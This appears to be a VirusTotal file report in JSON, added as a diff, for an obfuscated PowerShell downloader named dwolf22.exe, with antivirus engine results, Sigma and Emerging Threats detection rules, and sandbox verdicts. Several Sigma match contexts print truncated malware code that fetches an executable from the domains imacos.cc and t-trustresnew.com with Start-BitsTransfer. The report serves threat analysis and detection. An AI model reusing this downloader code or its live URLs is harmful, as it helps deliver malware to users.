@@ -1,0 +1,915 @@
+{
+  "data": {
+    "id": "400ea20fb2290912d2fdc1adc3ab137ea35b040184510d8c9db1ca0003fc4b40",
+    "type": "file",
+    "links": {
+      "self": "https://www.virustotal.com/api/v3/files/400ea20fb2290912d2fdc1adc3ab137ea35b040184510d8c9db1ca0003fc4b40"
+    },
+    "attributes": {
+      "sigma_analysis_summary": {
+        "Sigma Integrated Rule Set (GitHub)": {
+          "critical": 0,
+          "high": 0,
+          "medium": 3,
+          "low": 2
+        }
+      },
+      "sigma_analysis_stats": {
+        "critical": 0,
+        "high": 0,
+        "medium": 3,
+        "low": 2
+      },
+      "meaningful_name": "dwolf22.exe",
+      "last_analysis_stats": {
+        "malicious": 1,
+        "suspicious": 0,
+        "undetected": 60,
+        "harmless": 0,
+        "timeout": 0,
+        "confirmed-timeout": 0,
+        "failure": 0,
+        "type-unsupported": 14
+      },
+      "last_modification_date": 1794250870,
+      "times_submitted": 1,
+      "popular_threat_classification": {
+        "suggested_threat_label": "downloader.gen446",
+        "popular_threat_category": [
+          {
+            "count": 1,
+            "value": "downloader"
+          }
+        ],
+        "popular_threat_name": [
+          {
+            "count": 1,
+            "value": "gen446"
+          }
+        ]
+      },
+      "last_analysis_results": {
+        "Bkav": {
+          "method": "blacklist",
+          "engine_name": "Bkav",
+          "engine_version": "8.2.40(8338)",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Lionic": {
+          "method": "blacklist",
+          "engine_name": "Lionic",
+          "engine_version": "8.16",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "MicroWorld-eScan": {
+          "method": "blacklist",
+          "engine_name": "MicroWorld-eScan",
+          "engine_version": "14.0.409.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "ClamAV": {
+          "method": "blacklist",
+          "engine_name": "ClamAV",
+          "engine_version": "1.5.4.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "CMC": {
+          "method": "blacklist",
+          "engine_name": "CMC",
+          "engine_version": "2.4.2022.1",
+          "engine_update": "20261108",
+          "category": "undetected",
+          "result": null
+        },
+        "CAT-QuickHeal": {
+          "method": "blacklist",
+          "engine_name": "CAT-QuickHeal",
+          "engine_version": "22.00",
+          "engine_update": "20261108",
+          "category": "undetected",
+          "result": null
+        },
+        "Skyhigh": {
+          "method": "blacklist",
+          "engine_name": "Skyhigh",
+          "engine_version": "v2021.2.0+4045",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "ALYac": {
+          "method": "blacklist",
+          "engine_name": "ALYac",
+          "engine_version": "2.0.0.10",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Malwarebytes": {
+          "method": "blacklist",
+          "engine_name": "Malwarebytes",
+          "engine_version": "3.1.0.296",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "VIPRE": {
+          "method": "blacklist",
+          "engine_name": "VIPRE",
+          "engine_version": "6.0.0.35",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Sangfor": {
+          "method": "blacklist",
+          "engine_name": "Sangfor",
+          "engine_version": "2.22.3.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "K7AntiVirus": {
+          "method": "blacklist",
+          "engine_name": "K7AntiVirus",
+          "engine_version": "14.91.61413",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "K7GW": {
+          "method": "blacklist",
+          "engine_name": "K7GW",
+          "engine_version": "14.91.61415",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "CrowdStrike": {
+          "method": "blacklist",
+          "engine_name": "CrowdStrike",
+          "engine_version": "1.0",
+          "engine_update": "20230417",
+          "category": "undetected",
+          "result": null
+        },
+        "huorong": {
+          "method": "blacklist",
+          "engine_name": "huorong",
+          "engine_version": "691424c:691424c:0b37565:0b37565",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "VirIT": {
+          "method": "blacklist",
+          "engine_name": "VirIT",
+          "engine_version": "9.5.1335",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Symantec": {
+          "method": "blacklist",
+          "engine_name": "Symantec",
+          "engine_version": "1.22.0.0",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "ISB.Downloader!gen446"
+        },
+        "ESET-NOD32": {
+          "method": "blacklist",
+          "engine_name": "ESET-NOD32",
+          "engine_version": "18.2.18.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "TrendMicro-HouseCall": {
+          "method": "blacklist",
+          "engine_name": "TrendMicro-HouseCall",
+          "engine_version": "24.550.0.1002",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Avast": {
+          "method": "blacklist",
+          "engine_name": "Avast",
+          "engine_version": "23.9.8494.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Cynet": {
+          "method": "blacklist",
+          "engine_name": "Cynet",
+          "engine_version": "4.0.3.4",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Kaspersky": {
+          "method": "blacklist",
+          "engine_name": "Kaspersky",
+          "engine_version": "22.0.1.28",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "BitDefender": {
+          "method": "blacklist",
+          "engine_name": "BitDefender",
+          "engine_version": "7.2",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "NANO-Antivirus": {
+          "method": "blacklist",
+          "engine_name": "NANO-Antivirus",
+          "engine_version": "1.0.170.26895",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "SUPERAntiSpyware": {
+          "method": "blacklist",
+          "engine_name": "SUPERAntiSpyware",
+          "engine_version": "5.6.0.1032",
+          "engine_update": "20261107",
+          "category": "undetected",
+          "result": null
+        },
+        "Rising": {
+          "method": "blacklist",
+          "engine_name": "Rising",
+          "engine_version": "25.0.0.28",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Sophos": {
+          "method": "blacklist",
+          "engine_name": "Sophos",
+          "engine_version": "3.7.2.1",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "F-Secure": {
+          "method": "blacklist",
+          "engine_name": "F-Secure",
+          "engine_version": "18.10.1547.307",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "DrWeb": {
+          "method": "blacklist",
+          "engine_name": "DrWeb",
+          "engine_version": "7.0.76.8280",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Zillya": {
+          "method": "blacklist",
+          "engine_name": "Zillya",
+          "engine_version": "2.0.0.5725",
+          "engine_update": "20261106",
+          "category": "undetected",
+          "result": null
+        },
+        "TrendMicro": {
+          "method": "blacklist",
+          "engine_name": "TrendMicro",
+          "engine_version": "24.550.0.1002",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "McAfeeD": {
+          "method": "blacklist",
+          "engine_name": "McAfeeD",
+          "engine_version": "1.2.0.16534",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "CTX": {
+          "method": "blacklist",
+          "engine_name": "CTX",
+          "engine_version": "2026.10.27.1",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Emsisoft": {
+          "method": "blacklist",
+          "engine_name": "Emsisoft",
+          "engine_version": "2024.8.0.61147",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Ikarus": {
+          "method": "blacklist",
+          "engine_name": "Ikarus",
+          "engine_version": "6.5.4.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "GData": {
+          "method": "blacklist",
+          "engine_name": "GData",
+          "engine_version": "GD:27.46657AVA:64.32204",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Jiangmin": {
+          "method": "blacklist",
+          "engine_name": "Jiangmin",
+          "engine_version": "16.0.100",
+          "engine_update": "20261108",
+          "category": "undetected",
+          "result": null
+        },
+        "Varist": {
+          "method": "blacklist",
+          "engine_name": "Varist",
+          "engine_version": "6.6.1.3",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Avira": {
+          "method": "blacklist",
+          "engine_name": "Avira",
+          "engine_version": "8.3.3.24",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Antiy-AVL": {
+          "method": "blacklist",
+          "engine_name": "Antiy-AVL",
+          "engine_version": "3.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Kingsoft": {
+          "method": "blacklist",
+          "engine_name": "Kingsoft",
+          "engine_version": "None",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Gridinsoft": {
+          "method": "blacklist",
+          "engine_name": "Gridinsoft",
+          "engine_version": "1.0.262.174",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Xcitium": {
+          "method": "blacklist",
+          "engine_name": "Xcitium",
+          "engine_version": "39100",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Arcabit": {
+          "method": "blacklist",
+          "engine_name": "Arcabit",
+          "engine_version": "2025.0.0.23",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "ViRobot": {
+          "method": "blacklist",
+          "engine_name": "ViRobot",
+          "engine_version": "2026-11-09.03",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "ZoneAlarm": {
+          "method": "blacklist",
+          "engine_name": "ZoneAlarm",
+          "engine_version": "6.28-119762367",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Microsoft": {
+          "method": "blacklist",
+          "engine_name": "Microsoft",
+          "engine_version": "1.26100",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Google": {
+          "method": "blacklist",
+          "engine_name": "Google",
+          "engine_version": "1794236479",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "AhnLab-V3": {
+          "method": "blacklist",
+          "engine_name": "AhnLab-V3",
+          "engine_version": "3.30.3.10716",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Acronis": {
+          "method": "blacklist",
+          "engine_name": "Acronis",
+          "engine_version": "1.2.0.121",
+          "engine_update": "20240328",
+          "category": "undetected",
+          "result": null
+        },
+        "VBA32": {
+          "method": "blacklist",
+          "engine_name": "VBA32",
+          "engine_version": "5.7.1",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "TACHYON": {
+          "method": "blacklist",
+          "engine_name": "TACHYON",
+          "engine_version": "2026-11-09.02",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Zoner": {
+          "method": "blacklist",
+          "engine_name": "Zoner",
+          "engine_version": "2.2.2.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Tencent": {
+          "method": "blacklist",
+          "engine_name": "Tencent",
+          "engine_version": "1.0.0.1",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Yandex": {
+          "method": "blacklist",
+          "engine_name": "Yandex",
+          "engine_version": "5.5.2.24",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "TrellixENS": {
+          "method": "blacklist",
+          "engine_name": "TrellixENS",
+          "engine_version": "6.0.6.653",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "SentinelOne": {
+          "method": "blacklist",
+          "engine_name": "SentinelOne",
+          "engine_version": "7.8.0.2",
+          "engine_update": "20260924",
+          "category": "undetected",
+          "result": null
+        },
+        "Fortinet": {
+          "method": "blacklist",
+          "engine_name": "Fortinet",
+          "engine_version": "7.0.48.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "AVG": {
+          "method": "blacklist",
+          "engine_name": "AVG",
+          "engine_version": "23.9.8494.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Panda": {
+          "method": "blacklist",
+          "engine_name": "Panda",
+          "engine_version": "4.6.4.2",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "alibabacloud": {
+          "method": "blacklist",
+          "engine_name": "alibabacloud",
+          "engine_version": "2.2.0",
+          "engine_update": "20250321",
+          "category": "undetected",
+          "result": null
+        },
+        "Avast-Mobile": {
+          "method": "blacklist",
+          "engine_name": "Avast-Mobile",
+          "engine_version": "261109-00",
+          "engine_update": "20261109",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "SymantecMobileInsight": {
+          "method": "blacklist",
+          "engine_name": "SymantecMobileInsight",
+          "engine_version": "2.0",
+          "engine_update": "20260123",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "BitDefenderFalx": {
+          "method": "blacklist",
+          "engine_name": "BitDefenderFalx",
+          "engine_version": "2.0.936",
+          "engine_update": "20261022",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "Elastic": {
+          "method": "blacklist",
+          "engine_name": "Elastic",
+          "engine_version": "4.0.297",
+          "engine_update": "20261109",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "tehtris": {
+          "method": "blacklist",
+          "engine_name": "tehtris",
+          "engine_version": null,
+          "engine_update": "20261109",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "Webroot": {
+          "method": "blacklist",
+          "engine_name": "Webroot",
+          "engine_version": "1.9.0.8",
+          "engine_update": "20250227",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "APEX": {
+          "method": "blacklist",
+          "engine_name": "APEX",
+          "engine_version": "6.839",
+          "engine_update": "20261107",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "Paloalto": {
+          "method": "blacklist",
+          "engine_name": "Paloalto",
+          "engine_version": "0.9.0.1003",
+          "engine_update": "20261109",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "Alibaba": {
+          "method": "blacklist",
+          "engine_name": "Alibaba",
+          "engine_version": "0.3.0.5",
+          "engine_update": "20190527",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "Trapmine": {
+          "method": "blacklist",
+          "engine_name": "Trapmine",
+          "engine_version": "4.0.17.0",
+          "engine_update": "20261026",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "Cylance": {
+          "method": "blacklist",
+          "engine_name": "Cylance",
+          "engine_version": "3.0.0.0",
+          "engine_update": "20261103",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "MaxSecure": {
+          "method": "blacklist",
+          "engine_name": "MaxSecure",
+          "engine_version": "4.0.3.0",
+          "engine_update": "20261109",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "Trustlook": {
+          "method": "blacklist",
+          "engine_name": "Trustlook",
+          "engine_version": "1.0",
+          "engine_update": "20261109",
+          "category": "type-unsupported",
+          "result": null
+        },
+        "DeepInstinct": {
+          "method": "blacklist",
+          "engine_name": "DeepInstinct",
+          "engine_version": "5.0.0.8",
+          "engine_update": "20260614",
+          "category": "type-unsupported",
+          "result": null
+        }
+      },
+      "ssdeep": "96:tmacUq59irAQcY+yYTD9BxzMbET0Xz5rB/W:tmaoir5cLyYTDZzM20NVO",
+      "tags": [
+        "powershell",
+        "calls-wmi",
+        "self-delete",
+        "obfuscated",
+        "macro-powershell",
+        "checks-network-adapters"
+      ],
+      "type_tag": "powershell",
+      "crowdsourced_ids_results": [
+        {
+          "rule_category": "Exploit Kit Activity Detected",
+          "alert_severity": "high",
+          "rule_msg": "ET EXPLOIT_KIT ClickFix Domain in DNS Lookup (imacos .cc)",
+          "rule_id": "1:2072189",
+          "rule_source": "Proofpoint Emerging Threats Open",
+          "rule_url": "https://rules.emergingthreats.net/",
+          "rule_raw": "alert dns $HOME_NET any -> any any (msg:\"ET EXPLOIT_KIT ClickFix Domain in DNS Lookup (imacos .cc)\"; dns.query; bsize:9; content:\"imacos.cc\"; nocase; reference:url,www.proofpoint.com/us/blog/threat-insight/clipboard-compromise-powershell-self-pwn; reference:url,blog.sekoia.io/interlock-ransomware-evolving-under-the-radar/; classtype:exploit-kit; sid:2072189; rev:1; metadata:affected_product Web_Browsers, attack_target Client_Endpoint, created_at 2026_09_23, deployment Perimeter, performance_impact Low, confidence High, signature_severity Minor, tag Exploit_Kit, tag compromised_website, tag Description_Generated_By_Proofpoint_Nexus, updated_at 2026_09_23, mitre_tactic_id TA0001, mitre_tactic_name Initial_Access, mitre_technique_id T1189, mitre_technique_name Drive_by_Compromise;)",
+          "rule_references": [
+            "https://www.proofpoint.com/us/blog/threat-insight/clipboard-compromise-powershell-self-pwn",
+            "https://blog.sekoia.io/interlock-ransomware-evolving-under-the-radar/"
+          ],
+          "alert_context": [
+            {
+              "dest_ip": "8.8.8.8",
+              "dest_port": 53
+            }
+          ]
+        },
+        {
+          "rule_category": "Exploit Kit Activity Detected",
+          "alert_severity": "high",
+          "rule_msg": "ET EXPLOIT_KIT ClickFix Domain in TLS SNI (imacos .cc)",
+          "rule_id": "1:2072233",
+          "rule_source": "Proofpoint Emerging Threats Open",
+          "rule_url": "https://rules.emergingthreats.net/",
+          "rule_raw": "alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET EXPLOIT_KIT ClickFix Domain in TLS SNI (imacos .cc)\"; flow:established,to_server; tls.sni; bsize:9; content:\"imacos.cc\"; fast_pattern; reference:url,www.proofpoint.com/us/blog/threat-insight/clipboard-compromise-powershell-self-pwn; reference:url,blog.sekoia.io/interlock-ransomware-evolving-under-the-radar/; classtype:exploit-kit; sid:2072233; rev:1; metadata:affected_product Web_Browsers, attack_target Client_Endpoint, created_at 2026_09_23, deployment Perimeter, performance_impact Low, confidence High, signature_severity Minor, tag Exploit_Kit, tag compromised_website, tag Description_Generated_By_Proofpoint_Nexus, updated_at 2026_09_23, mitre_tactic_id TA0001, mitre_tactic_name Initial_Access, mitre_technique_id T1189, mitre_technique_name Drive_by_Compromise;)",
+          "rule_references": [
+            "https://www.proofpoint.com/us/blog/threat-insight/clipboard-compromise-powershell-self-pwn",
+            "https://blog.sekoia.io/interlock-ransomware-evolving-under-the-radar/"
+          ],
+          "alert_context": [
+            {
+              "dest_ip": "172.67.159.251",
+              "dest_port": 443,
+              "ja3": [
+                "28a2c9bd18a11de089ef85a160da29e4"
+              ],
+              "ja3s": [
+                "26179a98b4b1d80c27c3f2569196c6c7"
+              ]
+            }
+          ]
+        },
+        {
+          "rule_category": "Potentially Bad Traffic",
+          "alert_severity": "low",
+          "rule_msg": "ET DNS Query for .cc TLD",
+          "rule_id": "1:2027758",
+          "rule_source": "Proofpoint Emerging Threats Open",
+          "rule_url": "https://rules.emergingthreats.net/",
+          "rule_raw": "alert dns $HOME_NET any -> any any (msg:\"ET DNS Query for .cc TLD\"; dns.query; content:\".cc\"; endswith; fast_pattern; classtype:bad-unknown; sid:2027758; rev:5; metadata:affected_product Any, attack_target Client_Endpoint, created_at 2019_07_26, deployment Perimeter, confidence High, signature_severity Informational, updated_at 2020_09_17;)",
+          "alert_context": [
+            {
+              "dest_ip": "8.8.8.8",
+              "dest_port": 53
+            }
+          ]
+        }
+      ],
+      "last_analysis_date": 1794243634,
+      "type_extension": "ps1",
+      "first_submission_date": 1794243634,
+      "filecondis": {
+        "raw_md5": "8991197f6d06edef39bb6e8027fc8894",
+        "dhash": "f6f8f02000828240"
+      },
+      "sha1": "94223ec5c5100678f366a10f022babe7f101df78",
+      "magic": "ASCII text, with very long lines (4712u), with no line terminators",
+      "unique_sources": 1,
+      "sha256": "400ea20fb2290912d2fdc1adc3ab137ea35b040184510d8c9db1ca0003fc4b40",
+      "tlsh": "T18AA1635E3874E4D21A96A787F42A3FA3DB1433746ACEA3580254F7A46B7B31E4814CC8",
+      "magika": "POWERSHELL",
+      "last_submission_date": 1794243634,
+      "md5": "9a38c3e3431c2f174fc4b21fd0e77206",
+      "powershell_info": {
+        "cmdlets": [
+          "new-object"
+        ],
+        "cmdlets_alias": [
+          "iex"
+        ]
+      },
+      "size": 4712,
+      "type_tags": [
+        "source",
+        "powershell",
+        "ps",
+        "ps1"
+      ],
+      "reputation": 0,
+      "sigma_analysis_results": [
+        {
+          "rule_level": "medium",
+          "rule_id": "5e2ea8c055dd73ea66238735323d0318c2a6c114047137146357b85f764b1101",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "Suspicious PowerShell WindowStyle Option",
+          "rule_description": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.\nIn some cases, windows that would typically be displayed when an application carries out an operation can be hidden\n",
+          "rule_author": "frack113, Tim Shelton (fp AWS)",
+          "match_context": [
+            {
+              "values": {
+                "ScriptBlockText": "$sp=Join-Path $env:USERPROFILE ('Downloads\\'+([string](Get-Random)+'exe.ps1'));Set-Content -LiteralPath $sp -Value '$outPath=Join-Path $env:USERPROFILE (''Downloads\\''+(''Install''+[string](Get-Random -Min 10 -Max 99)+''.exe''));$urls=@(''https://imacos.cc/p?t=39cfa4676780'',''https://t-trustresnew.com/p?t=39cfa4676780'');$need=1084416;$want=''F9547AE9DF3F22011CFEC999B8B10C6CDBF63CC8AECDB04415619983E6DF0671'';$ok=$false;while(-not $ok){foreach($url in $urls){if($ok){break};Remove-Item -LiteralPa [TRUNCATED]",
+                "MessageTotal": "1",
+                "ScriptBlockId": "ddad3dea-70cb-4fc9-9648-8b385a44fafe",
+                "Path": "",
+                "MessageNumber": "1",
+                "EventID": "4104"
+              }
+            }
+          ]
+        },
+        {
+          "rule_level": "medium",
+          "rule_id": "6291f85314c7d9966be831c56d3cdfb30f42c84f599273e73dac5c95e1122abf",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "Usage Of Web Request Commands And Cmdlets - ScriptBlock",
+          "rule_description": "Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs",
+          "rule_author": "James Pemberton / @4A616D6573",
+          "match_context": [
+            {
+              "values": {
+                "ScriptBlockText": "$sp=Join-Path $env:USERPROFILE ('Downloads\\'+([string](Get-Random)+'exe.ps1'));Set-Content -LiteralPath $sp -Value '$outPath=Join-Path $env:USERPROFILE (''Downloads\\''+(''Install''+[string](Get-Random -Min 10 -Max 99)+''.exe''));$urls=@(''https://imacos.cc/p?t=39cfa4676780'',''https://t-trustresnew.com/p?t=39cfa4676780'');$need=1084416;$want=''F9547AE9DF3F22011CFEC999B8B10C6CDBF63CC8AECDB04415619983E6DF0671'';$ok=$false;while(-not $ok){foreach($url in $urls){if($ok){break};Remove-Item -LiteralPa [TRUNCATED]",
+                "Path": "",
+                "ScriptBlockId": "ddad3dea-70cb-4fc9-9648-8b385a44fafe",
+                "MessageTotal": "1",
+                "MessageNumber": "1",
+                "EventID": "4104"
+              }
+            },
+            {
+              "values": {
+                "ScriptBlockText": "$outPath=Join-Path $env:USERPROFILE ('Downloads\\'+('Install'+[string](Get-Random -Min 10 -Max 99)+'.exe'));$urls=@('https://imacos.cc/p?t=39cfa4676780','https://t-trustresnew.com/p?t=39cfa4676780');$need=1084416;$want='F9547AE9DF3F22011CFEC999B8B10C6CDBF63CC8AECDB04415619983E6DF0671';$ok=$false;while(-not $ok){foreach($url in $urls){if($ok){break};Remove-Item -LiteralPath $outPath -Force -EA 0;try{Start-BitsTransfer -Source $url -Destination $outPath -DisplayName 'Downloading...' -Description 'P [TRUNCATED]",
+                "Path": "C:\\Users\\Bruno\\Downloads\\2083458630exe.ps1",
+                "ScriptBlockId": "083f2330-9a8a-4d08-bb85-e8aa54bd0f6b",
+                "MessageTotal": "1",
+                "EventID": "4104",
+                "MessageNumber": "1"
+              }
+            }
+          ]
+        },
+        {
+          "rule_level": "medium",
+          "rule_id": "89e801c894097380321f8d053ed1de87b584d895d5b7de28ee9167d1e0aa90bd",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "Sysmon File Executable Creation Detected",
+          "rule_description": "Detects Portable Executable (PE) files creation events logged by Sysmon in paths monitored by the used Sysmon configuration.\nThis is a high-value detection for catching unauthorized or suspicious executable drops.\nAlert volume and scope depend entirely on which paths or files are monitored in the Sysmon config.\nA high noise level or hits from known-legitimate software are a strong signal that the Sysmon configuration is too permissive, not that the detection itself is wrong and probably needs to be tuned to a more restrictive set of paths or files.\n",
+          "rule_author": "frack113",
+          "match_context": [
+            {
+              "values": {
+                "Hashes": "SHA1=E58FCBB6359C06F36F2AF7ECD0A6F05CF1AE2875,MD5=0F91B29A1233B6A21843A921C7C8D760,SHA256=F9547AE9DF3F22011CFEC999B8B10C6CDBF63CC8AECDB04415619983E6DF0671,IMPHASH=253A628D78BB89E78C8804F1B263AE35",
+                "Image": "C:\\Windows\\System32\\svchost.exe",
+                "EventID": "29",
+                "TargetFilename": "C:\\Users\\Bruno\\Downloads\\BIT2457.tmp"
+              }
+            }
+          ]
+        },
+        {
+          "rule_level": "low",
+          "rule_id": "1c2e4db94ca79f939e94e29c04fb3b71467fc6f5b9c31db34fcce5a2fb3b856f",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "Non Interactive PowerShell Process Spawned",
+          "rule_description": "Detects non-interactive PowerShell activity by looking at the \"powershell\" process with a non-user GUI process such as \"explorer.exe\" as a parent.",
+          "rule_author": "Roberto Rodriguez @Cyb3rWard0g (rule), oscd.community (improvements)",
+          "match_context": [
+            {
+              "values": {
+                "Hashes": "SHA1=F43D9BB316E30AE1A3494AC5B0624F6BEA1BF054,MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7",
+                "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                "OriginalFileName": "PowerShell.EXE",
+                "Product": "Microsoft\\xae Windows\\xae Operating System",
+                "Description": "Windows PowerShell",
+                "EventID": "1",
+                "ParentCommandLine": "\"C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -ExecutionPolicy bypass -File \"C:\\Users\\Bruno\\Desktop\\400ea20fb2290912.ps1\"",
+                "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\Bruno\\Downloads\\2083458630exe.ps1 ",
+                "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+                "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "IntegrityLevel": "Medium",
+                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "Company": "Microsoft Corporation"
+              }
+            }
+          ]
+        },
+        {
+          "rule_level": "low",
+          "rule_id": "7cf0b126730658e7c96da1ae0b63c1bb84154a239ca32c09909963038dfdcacf",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "PowerShell Script Dropped Via PowerShell.EXE",
+          "rule_description": "Detects PowerShell creating a PowerShell file (.ps1). While often times this behavior is benign, sometimes it can be a sign of a dropper script trying to achieve persistence.",
+          "rule_author": "frack113",
+          "match_context": [
+            {
+              "values": {
+                "Image": "C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "TargetFilename": "C:\\Users\\Bruno\\Downloads\\2083458630exe.ps1",
+                "EventID": "11"
+              }
+            }
+          ]
+        }
+      ],
+      "vhash": "1bde23d884ac35207ce72773702352f2",
+      "names": [
+        "dwolf22.exe",
+        "400ea20fb2290912d2fdc1adc3ab137ea35b040184510d8c9db1ca0003fc4b40.ps1",
+        "400ea20fb2290912.ps1"
+      ],
+      "trid": [
+        {
+          "file_type": "file seems to be plain text/ASCII",
+          "probability": 0.0
+        }
+      ],
+      "type_description": "Powershell",
+      "total_votes": {
+        "harmless": 0,
+        "malicious": 0
+      },
+      "crowdsourced_ids_stats": {
+        "high": 2,
+        "medium": 0,
+        "low": 1,
+        "info": 0
+      },
+      "sandbox_verdicts": {
+        "CAPE Sandbox": {
+          "category": "malicious",
+          "malware_classification": [
+            "MALWARE"
+          ],
+          "sandbox_name": "CAPE Sandbox",
+          "malware_names": [
+            "ZINCCASK"
+          ],
+          "confidence": 90
+        },
+        "Zenbox": {
+          "category": "harmless",
+          "malware_classification": [
+            "CLEAN"
+          ],
+          "sandbox_name": "Zenbox",
+          "confidence": 99
+        }
+      }
+    }
+  }
+}
